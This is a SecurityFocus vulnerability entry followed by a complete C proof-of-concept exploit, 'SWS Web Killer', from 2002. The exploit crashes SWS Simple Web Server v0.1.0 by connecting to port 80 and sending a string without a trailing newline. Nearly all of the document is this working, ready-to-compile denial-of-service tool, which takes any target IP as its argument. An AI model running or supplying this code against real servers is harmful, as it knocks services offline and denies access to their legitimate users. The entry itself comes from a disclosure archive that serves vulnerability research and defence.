source: http://www.securityfocus.com/bid/5664/info

SWS Simple Web Server is prone to a denial of service when requests not ending with a newline are received.

Remote attackers may exploit this condition to deny access to legitimate users of the web server. 

/*
 * Mon Sep  2 17:45:04 2002
 *
 * |SaMaN| aka Mert <saman@hush.com>
 *
 * Information  : Anyone can kill SWS Web Server v0.1.0 remotely.
 *
 * Proof of Concept Exploit for SWS Web Server v0.1.0
 *
 * SWS homepage : http://www.linuxprogramlama.com
 *
 * Tested on    : Slackware 8.1 - 2.4.18
 *              : Redhat 7.0    - 2.2.16-22
 *
 * Problem      : sws_web_server.c
 *              : line 108
 *              : if (recvBuffer[i - 1] != '\n') break;
 *
 * Q : So what will happen when we send a string not end with '\n' ?
 * A : break break break
 * Q : So root should restart web server everytime ?
 * A : Yes
 * Q : Other web servers act like this ?
 * A : No
 * Q : So something is wrong ?
 * A : Yes :)
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define K  "\033[1;31m"
#define Y  "\033[1;32m"
#define SA "\033[1;33m"
#define M  "\033[1;34m"

#define PORT 80

int main(int argc, char *argv[])
{
   int sockfd, numbytes;
   struct hostent *adres;
   struct sockaddr_in hedef;

   char buf[8] = "|SaMaN|";

   if (argc != 2) {
      printf("%s=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n", K);
      printf("%sSWS Web Killer (saman@hush.com)  \n", SA);
      printf("%s=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n", K);
      printf("%sUsage: ./sws_web_killer %s<IP>   \n",Y,M);
      return 0;
   }

   if ((adres=gethostbyname(argv[1])) == NULL) {
      perror("gethostbyname");
      exit(1);
   }

   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
      perror("socket");
      exit(1);
   }

   hedef.sin_family = AF_INET;
   hedef.sin_port = htons(PORT);
   hedef.sin_addr = *((struct in_addr *)adres->h_addr);
   memset(&(hedef.sin_zero), '\0', 8);

   if (connect(sockfd, (struct sockaddr *)&hedef,
                                     sizeof(struct sockaddr)) == -1)
   {
        perror("connect");
        exit(1);
   }

   if ((numbytes=send(sockfd, buf, strlen(buf), 0)) == -1) {
        perror("send");
        exit(1);
   }

   close(sockfd);

   return 0;
}